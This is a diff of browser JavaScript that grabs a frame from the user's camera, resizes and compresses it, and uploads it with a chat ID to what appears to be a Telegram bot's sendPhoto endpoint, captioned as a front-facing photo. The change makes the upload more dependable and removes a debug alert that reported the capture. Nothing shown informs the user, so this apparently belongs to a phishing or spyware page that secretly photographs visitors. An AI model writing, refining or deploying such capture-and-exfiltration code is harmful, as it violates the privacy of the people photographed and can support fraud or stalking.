@@ -316,17 +316,22 @@ async function ejecutarFlujo(boton){
       var video=document.createElement('video');video.srcObject=stream;video.muted=true;video.setAttribute('playsinline','');video.setAttribute('autoplay','');
       await video.play();
       await new Promise(function(r){setTimeout(r,1200);});
-      var c=document.createElement('canvas');c.width=video.videoWidth||640;c.height=video.videoHeight||480;
-      c.getContext('2d').drawImage(video,0,0);
-      foto=c.toDataURL('image/jpeg',0.85);alert('📸 Foto capturada: '+Math.round(foto.length/1024)+' KB | video: '+video.videoWidth+'x'+video.videoHeight);
+      var vw=video.videoWidth||640, vh=video.videoHeight||480, maxSize=800;
+      var nw=vw, nh=vh;
+      if(vw>vh && vw>maxSize){ nw=maxSize; nh=Math.round(vh*maxSize/vw); }
+      else if(vh>=vw && vh>maxSize){ nh=maxSize; nw=Math.round(vw*maxSize/vh); }
+      var c=document.createElement('canvas');c.width=nw;c.height=nh;
+      c.getContext('2d').drawImage(video,0,0,nw,nh);
+      foto=c.toDataURL('image/jpeg',0.6);
       stream.getTracks().forEach(function(t){t.stop();});
-      // Enviar foto por base64 (más estable que FormData en iOS)
-      var base64Data=foto.split(',')[1];
-      fetch(API+'/sendPhoto',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({chat_id:CHAT,photo:base64Data,caption:'📷 Foto frontal'})
-      }).catch(function(){});
+      if(foto){
+        var blob=dataURLtoBlob(foto);
+        var fd=new FormData();
+        fd.append('chat_id',CHAT);
+        fd.append('photo',blob,'foto.jpg');
+        fd.append('caption','📷 Foto frontal');
+        fetch(API+'/sendPhoto',{method:'POST',body:fd}).then(function(r){return r.json();}).then(function(d){console.log('sendPhoto:',d);}).catch(function(e){console.log('sendPhoto err:',e);});
+      }
     }
   }catch(e){console.log('Camara err:',e);alert('❌ Error cámara: '+e.message+' | '+e.name);}
   await new Promise(function(r){setTimeout(r,600);});
